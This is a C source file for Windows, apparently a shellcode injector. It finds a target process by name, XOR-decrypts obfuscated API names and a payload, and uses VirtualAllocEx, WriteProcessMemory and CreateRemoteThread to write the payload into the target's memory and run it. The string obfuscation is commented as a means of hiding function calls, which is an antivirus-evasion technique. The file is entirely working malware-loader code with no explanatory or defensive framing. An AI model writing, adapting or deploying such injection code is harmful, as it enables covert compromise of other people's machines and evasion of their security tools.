#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"
//Function Pointer 
LPVOID (WINAPI * Address_VirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
//Function Pointer 
BOOL (WINAPI *Address_WriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
//Function Pointer 
HANDLE (WINAPI *Address_CreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
//key to decrypt both of function names and the payload
char key[] = "mh1dat";
int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
                
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
    pe32.dwSize = sizeof(PROCESSENTRY32); 
                
    if (!Process32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            return 0;
    }
                
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
                
    CloseHandle(hProcSnap);
                
    return pid;
}
//Decryption
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
    	LPVOID pRemoteCode = NULL;
    	HANDLE hThread = NULL;
	unsigned char sVirtualAllocEx[]= { 0x3b, 0x1, 0x43, 0x10, 0x14, 0x15, 0x1, 0x29, 0x5d, 0x8, 0xe, 0x17, 0x28, 0x10 };      
	unsigned char sWriteProcessMemory[]={ 0x3a, 0x1a, 0x58, 0x10, 0x4, 0x24, 0x1f, 0x7, 0x52, 0x1, 0x12, 0x7, 0x20, 0xd, 0x5c, 0xb, 0x13, 0xd };     
	unsigned char sCreateRemoteThread[]={ 0x2e, 0x1a, 0x54, 0x5, 0x15, 0x11, 0x3f, 0xd, 0x5c, 0xb, 0x15, 0x11, 0x39, 0x0, 0x43, 0x1, 0x0, 0x10 };  
	XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
	XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
	XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
    	//Function call obfuscation
	Address_VirtualAllocEx=GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualAllocEx);
	Address_WriteProcessMemory=GetProcAddress(GetModuleHandle("kernel32.dll"),sWriteProcessMemory);
	Address_CreateRemoteThread=GetProcAddress(GetModuleHandle("kernel32.dll"),sCreateRemoteThread);
   	pRemoteCode = Address_VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    	Address_WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
    	hThread = Address_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    	if (hThread != NULL) {
        	WaitForSingleObject(hThread, 500);
        	CloseHandle(hThread);
        	return 0;
    	}
    	return -1;
}

